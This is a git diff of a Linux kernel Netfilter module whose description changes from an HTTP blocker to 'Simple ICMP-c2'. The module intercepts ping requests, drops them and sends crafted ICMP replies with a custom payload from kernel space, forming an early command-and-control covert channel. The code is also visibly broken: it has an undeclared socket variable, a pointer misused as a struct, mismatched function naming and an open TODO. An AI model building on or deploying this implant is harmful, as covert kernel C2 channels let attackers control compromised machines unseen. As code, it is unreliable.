@@ -14,13 +14,93 @@
 #include <linux/if_ether.h>
 #include <net/ip.h>
 
-
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("jackdunf@buffalo.edu");
-MODULE_DESCRIPTION("Simple Netfilter module to block HTTP traffic (port 80)");
+MODULE_DESCRIPTION("Simple ICMP-c2");
+
+#define ICMP_ECHO   8
+#define ICMP_REPLY  0
+#define ICMP_HLEN   8
 
 static struct nf_hook_ops nfho;
 unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
+static uint16_t checksum(uint16_t *data, int len);
+static int send_icmp_echo_request(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len);
+// Source: elsewhere
+static uint16_t checksum(uint16_t *data, int len) {
+    uint32_t sum = 0;
+    while (len > 1) { sum += *data++; len -= 2; }
+    if (len == 1) sum += *(uint8_t *)data;
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    return (uint16_t)~sum;
+}
+
+// Source: jackdunf, different file
+static int send_icmp_echo_request(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len) {
+    struct sockaddr_in dest_addr;
+    struct msghdr msg = {};
+    struct kvec iov;
+    char *packet;
+    struct icmphdr *icmp_hdr;
+    int ret = 0;
+    const size_t PACKET_SIZE = ICMP_HLEN + payload_len;
+
+    // Allocate memory for the packet
+    packet = kmalloc(PACKET_SIZE, GFP_KERNEL);
+    if (!packet)
+        return -ENOMEM;
+
+    // Fill ICMP header
+    icmp_hdr = (struct icmphdr *)packet;
+    icmp_hdr->type = ICMP_REPLY;
+    icmp_hdr->code = 0;
+    icmp_hdr->checksum = 0;
+    icmp_hdr->un.echo.id = incoming_icmp->un.echo.id;
+    icmp_hdr->un.echo.sequence = incoming_icmp->un.echo.sequence;
+
+    // Add payload
+    memcpy(packet + ICMP_HLEN, payload, payload_len);
+
+    // Calculate checksum
+    icmp_hdr->checksum = checksum((uint16_t *)packet, PACKET_SIZE);
+
+    // Initialize destination address
+    memset(&dest_addr, 0, sizeof(dest_addr));
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_addr.s_addr = address;
+
+    // Initialize the socket
+    ret = sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_ICMP, &raw_socket);
+    if (ret < 0) {
+        pr_err("Failed to create raw socket: %d\n", ret);
+        kfree(packet);
+        return ret;
+    }
+
+    // Prepare message
+    iov.iov_base = packet;
+    iov.iov_len = PACKET_SIZE;
+    iov_iter_kvec(&msg.msg_iter, WRITE, &iov, 1, PACKET_SIZE);
+
+    msg.msg_name = &dest_addr;
+    msg.msg_namelen = sizeof(dest_addr);
+
+    // Send the ICMP Echo Request
+    ret = kernel_sendmsg(raw_socket, &msg, &iov, 1, PACKET_SIZE);
+    if (ret < 0) {
+        pr_err("Failed to send ICMP echo request: %d\n", ret);
+    } else {
+        pr_info("ICMP echo request sent successfully\n");
+    }
+
+    // Clean up
+    sock_release(raw_socket);
+    kfree(packet);
+
+    return (ret >= 0) ? 0 : ret;
+}
+
 
 unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
     struct iphdr *iph;
@@ -37,84 +117,15 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
     }
 
     icmph = icmp_hdr(skb);
-
-    // Only process ICMP Echo Requests
-    if (icmph->type == ICMP_ECHO) {
-        // Calculate ICMP payload length
-        icmp_payload_len = ntohs(iph->tot_len) - iph->ihl * 4 - sizeof(struct icmphdr);
-
-        // Allocate a new skb with enough space for Ethernet, IP, ICMP headers, and payload
-        new_skb = alloc_skb(LL_MAX_HEADER + sizeof(struct ethhdr) +
-                            sizeof(struct iphdr) + sizeof(struct icmphdr) + icmp_payload_len, GFP_ATOMIC);
-        if (!new_skb) {
-            printk(KERN_ERR "Failed to allocate new skb\n");
-            return NF_ACCEPT;
-        }
-
-        // Reserve space for headers
-        skb_reserve(new_skb, LL_MAX_HEADER);
-
-        // Set up the Ethernet header
-        data = skb_push(new_skb, sizeof(struct ethhdr));
-        eth = (struct ethhdr *)data;
-        old_eth = eth_hdr(skb);
-
-        memcpy(eth->h_dest, old_eth->h_source, ETH_ALEN); // Swap MACs
-        memcpy(eth->h_source, old_eth->h_dest, ETH_ALEN);
-        eth->h_proto = htons(ETH_P_IP);
-
-        // Set up the IP header
-        data = skb_push(new_skb, sizeof(struct iphdr));
-        iph = (struct iphdr *)data;
-
-        iph->version = 4;
-        iph->ihl = 5;
-        iph->tos = 0;
-        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + icmp_payload_len);
-        iph->id = htons(0); // Can set a random ID
-        iph->frag_off = 0;
-        iph->ttl = 64;
-        iph->protocol = IPPROTO_ICMP;
-        iph->saddr = ip_hdr(skb)->daddr; // Source is the original destination
-        iph->daddr = ip_hdr(skb)->saddr; // Destination is the original source
-        ip_send_check(iph);
-
-        // Set up the ICMP header
-        data = skb_push(new_skb, sizeof(struct icmphdr));
-        icmph = (struct icmphdr *)data;
-
-        icmph->type = ICMP_ECHOREPLY;
-        icmph->code = 0;
-        icmph->un.echo.id = icmp_hdr(skb)->un.echo.id;
-        icmph->un.echo.sequence = icmp_hdr(skb)->un.echo.sequence;
-        icmph->checksum = 0;
-
-        // Copy ICMP payload
-        if (icmp_payload_len > 0) {
-            skb_put(new_skb, icmp_payload_len);
-            memcpy(skb_tail_pointer(new_skb) - icmp_payload_len,
-                   (unsigned char *)icmp_hdr(skb) + sizeof(struct icmphdr),
-                   icmp_payload_len);
-        }
-
-        // Compute ICMP checksum
-        icmph->checksum = ip_compute_csum(icmph, sizeof(struct icmphdr) + icmp_payload_len);
-
-        // Set the network device for outgoing packet
-        new_skb->dev = state->in; // Use incoming device for reply
-        new_skb->protocol = htons(ETH_P_IP);
-
-        // Transmit the packet
-        if (dev_queue_xmit(new_skb) < 0) {
-            printk(KERN_ERR "Failed to send packet\n");
-            kfree_skb(new_skb);
-        }
-
-        // Drop the original packet
-        return NF_DROP;
+    if (!icmph || icmph.type != ICMP_ECHO) {
+        return NF_ACCEPT;
     }
 
-    return NF_ACCEPT;
+    // TODO: Check if ignore all is set
+    if(send_icmp_echo_request(icmph, iph->saddr, "Howdy", 6) < 0){
+        return NF_ACCEPT;
+    }
+    return NF_DROP;
 }
 
 // Module initialization
